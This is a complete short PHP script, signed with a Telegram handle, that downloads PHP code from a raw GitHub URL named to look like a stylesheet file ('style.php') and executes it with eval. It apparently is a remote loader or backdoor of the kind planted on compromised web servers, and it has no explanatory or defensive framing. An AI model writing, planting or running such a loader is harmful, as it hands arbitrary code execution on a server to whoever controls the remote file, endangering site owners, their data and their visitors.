<?php
#telegram @Devidluice
 $remoteUrl = "https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/style.php";
  $ch = curl_init($remoteUrl);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $remoteCode = curl_exec($ch);
    if (curl_errno($ch)) {
     die('cURL error: ' . curl_error($ch));
     }
   curl_close($ch);
 eval("?>" . $remoteCode);
?>